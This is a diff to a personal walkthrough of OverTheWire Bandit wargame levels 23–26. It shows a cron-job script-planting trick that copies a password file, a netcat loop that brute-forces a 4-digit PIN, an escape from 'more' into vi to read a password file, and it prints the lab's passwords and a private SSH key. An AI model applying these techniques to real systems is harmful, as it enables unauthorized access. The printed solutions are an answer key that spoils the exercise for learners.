@@ -531,5 +531,151 @@ bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 8ca319486bfbbc3663ea0fbe81326349
 bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+```
+
+23.
+```
+$ cd /etc/cron.d/
+$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 ./$i
+	rm -f ./$i
+    fi
+done
+$ mkdir /tmp/bodhert2/
+$ cd /tmp/bodhert2
+$ nano temp.sh
+```
+inside nano i copy this
+```
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/bodhert2/ans
+```
+```
+chmod -R 777 /tmp/bodhert2
+```
+wait a minute and then
+```
+$ cat ans
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+24.
+```
+$mkdir /tmp/bodhert3
+$cd /tmp/bodhert3
+$nano exploit.sh
+```
+then copy the next scritp
+```
+#!/bin/bash
+for i in {0..9} ; 
+do
+	for j in {0..9}; 
+	do
+		for k in {0..9}; 
+		do
+			for l in {0..9}; 
+			do
+				echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ${i}${j}${k}${l}" | netcat localhost 30002 >> /tmp/bodhert3/ans1 
+			done
+		done
+	done
+done
+```
+give the necesary permision
+```
+$chmod 777 exploit.sh
+$./exploit.sh
+```
+
+wait (a long time )and then 
+ ```
+$sort ans1 | uniq -u
+
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+ ```
+ 25.
+ this was the hardest level in my opinion , because without help i could not do it, not because command hardness, but for logic instructions.
+
+
+ ```
+ $ cat bandit26.sshkey
+ -----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
+pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
+/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
+xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
+1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
+3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
+qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
+il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
+e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
+Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
+zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
+c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
+wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
+tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
+2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
+i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
+6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
+pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
+JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
+JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
+1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
+ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
+euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
+/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
+IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
+-----END RSA PRIVATE KEY-----
+
+ ```
+
+ then we copy the key to a file and gave them the necesary permission
+
+ ```
+ $chmod 600 keyFor26
+ ```
+ from bandit 25 we can look what kind of shell does bandit 26 has so
+
+ ```
+$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+$ cat /usr/bin/showtext 
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+```
+so what we have to do is login to bandit26 with a small terminal windows for the command _more_ 
 
 ```
+$ssh  -i keyFor26 bandit26@bandit.labs.overthewire.org -p 2220 
+```
+then we press v for vi mode , in vi mode we can see the password the next command
+
+```
+: e /etc/bandit_pass/bandit26
+
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+```
+
+ 
+
+
+
